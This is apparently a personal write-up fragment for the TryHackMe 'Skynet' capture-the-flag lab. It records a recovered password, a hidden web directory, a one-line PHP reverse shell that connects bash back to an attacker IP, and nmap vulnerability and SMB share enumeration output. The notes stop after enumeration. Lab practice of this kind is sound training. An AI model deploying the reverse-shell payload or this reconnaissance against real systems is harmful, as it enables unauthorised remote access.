---

title: SKYNET

date: 2024-12-31 08:02:37

tags:

---
SKYNET - TRYHACKME

#ctf #off #windows

PASSWORD: cyborg007haloterminator
HIDDEN DIRECTORY : /45kra24zxs28v3yd
```
<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.17.90.162/443 0>&1’”);?>
```


```nmap -script vuln 10.10.43.196
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 17:53 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.43.196
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.43.196
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.43.196:80/
|     Form id: 
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   [[/squirrelmail/src/login.php]]: squirrelmail version 1.4.23 [svn]
|_  /squirrelmail/images/sm_logo.png: SquirrelMail
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

Nmap done: 1 IP address (1 host up) scanned in 355.14 seconds

```
HINT : ENUMERATE SAMBA
```sudo !!
sudo nmap -sU -sS --script smb-enum-shares.nse -p 139,445 10.10.43.196
[sudo] password for clueless: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 18:42 IST
Nmap scan report for 10.10.43.196
Host is up (0.16s latency).

PORT    STATE  SERVICE
139/tcp open   netbios-ssn
445/tcp open   microsoft-ds
139/udp closed netbios-ssn
445/udp closed microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.43.196\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.43.196\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.43.196\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share                                                                                                                                                                                                   
|     Users: 0                                                                                                                                                                                                                              
|     Max Users: <unlimited>                                                                                                                                                                                                                
|     Path: C:\home\milesdyson\share                                                                                                                                                                                                        
|     Anonymous access: <none>                                                                                                                                                                                                              
|     Current user access: <none>                                                                                                                                                                                                           
|   \\10.10.43.196\print$:                                                                                                                                                                                                                  
|     Type: STYPE_DISKTREE                                                                                                                                                                                                                  
|     Comment: Printer Drivers                                                                                                                                                                                                              
|     Users: 0                                                                                                                                                                                                                              
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 31.18 seconds

```